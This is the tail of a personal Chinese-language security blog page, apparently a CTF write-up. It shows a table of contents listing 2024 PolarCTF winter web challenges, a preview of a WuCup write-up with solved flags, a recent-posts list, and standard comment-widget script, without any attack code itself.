class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">2024WuCup-wp</div></div><div class="info-2"><div class="info-item-1">wucup-DDLmisc太极   1234567891011tai ji sheng liang yiliang yi sheng si xiangsi xiang sheng ba guaba gua ding ji xiongji xiong sheng da yetieny   12341---太极亦是轮回lieig     123 2(1212 -4) 5   ----周而复始sieau      1232 2(12312)jieay        12321(12121)   元神WuCup{0e49b776-b732-4242-b91c-8c513a1f12ce}  WuCup{7c16e21c-31c2-439e-a814-bba2ca54101a} 把docx文件换成zip文件  模糊的这个东西，减淡加弱化 WuCup{6bb9d97d-7169-434b-a7cf-0ee0b6fdfa30}      ...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024polarctf-web%E5%86%AC%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-number">1.</span> <span class="toc-text">2024polarctf-web冬季个人挑战赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91xxmmll"><span class="toc-number">1.1.</span> <span class="toc-text">【WEB】xxmmll</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91%E8%B5%8C%E7%8E%8B-%E2%80%93%E6%B2%A1%E5%81%9A%E5%87%BA%E6%9D%A5"><span class="toc-number">1.2.</span> <span class="toc-text">【WEB】赌王 –没做出来</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91%E7%8B%97%E9%BB%91%E5%AD%90%E7%9A%84RCE"><span class="toc-number">1.3.</span> <span class="toc-text">【WEB】狗黑子的RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.0.0.1.</span> <span class="toc-text">打开文件使用函数替换</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%E6%9B%BF%E6%8D%A2"><span class="toc-number">1.3.0.0.2.</span> <span class="toc-text">查看目录文件使用函数替换</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91%E5%9D%8F%E6%8E%89%E7%9A%84%E4%B8%8A%E4%BC%A0%E9%A1%B5"><span class="toc-number">1.4.</span> <span class="toc-text">【WEB】坏掉的上传页</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91button"><span class="toc-number">1.5.</span> <span class="toc-text">【WEB】button</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91%E4%BA%95%E5%AD%97%E6%A3%8B"><span class="toc-number">1.6.</span> <span class="toc-text">【WEB】井字棋</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91%E7%AE%80%E5%8D%95%E7%9A%84%E5%AF%BC%E8%88%AA%E7%AB%99"><span class="toc-number">1.7.</span> <span class="toc-text">【WEB】简单的导航站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91%E5%9D%A6%E8%AF%9A%E7%9B%B8%E8%A7%81"><span class="toc-number">1.8.</span> <span class="toc-text">【WEB】坦诚相见</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E3%80%90WEB%E3%80%91Note"><span class="toc-number">1.9.</span> <span class="toc-text">【WEB】Note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.9.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1cmd"><span class="toc-number">1.10.</span> <span class="toc-text">任务cmd</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">1.10.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezezser"><span class="toc-number">1.11.</span> <span class="toc-text">ezezser</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">1.11.1.</span> <span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezUtil-java%E7%9A%84%E6%AC%A0%E7%9D%80"><span class="toc-number">1.12.</span> <span class="toc-text">ezUtil-java的欠着</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/08/2024polar-winter/" title="2024polar-winter">2024polar-winter</a><time datetime="2024-12-08T08:44:39.000Z" title="Created 2024-12-08 16:44:39">2024-12-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/03/wucup/" title="2024WuCup-wp">2024WuCup-wp</a><time datetime="2024-12-03T07:07:42.000Z" title="Created 2024-12-03 15:07:42">2024-12-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/23/%E5%9F%9F%E6%B8%97%E9%80%8F-NTLM-1/" title="域渗透-NTLM-1">域渗透-NTLM-1</a><time datetime="2024-10-23T08:47:46.000Z" title="Created 2024-10-23 16:47:46">2024-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/23/%E5%9F%9F%E5%92%8C%E5%B7%A5%E4%BD%9C%E7%BB%84/" title="域和工作组">域和工作组</a><time datetime="2024-10-23T06:44:37.000Z" title="Created 2024-10-23 14:44:37">2024-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/18/Ubuntu-blog-buid/" title="Ubuntu-blog-buid">Ubuntu-blog-buid</a><time datetime="2024-10-18T03:49:08.000Z" title="Created 2024-10-18 11:49:08">2024-10-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
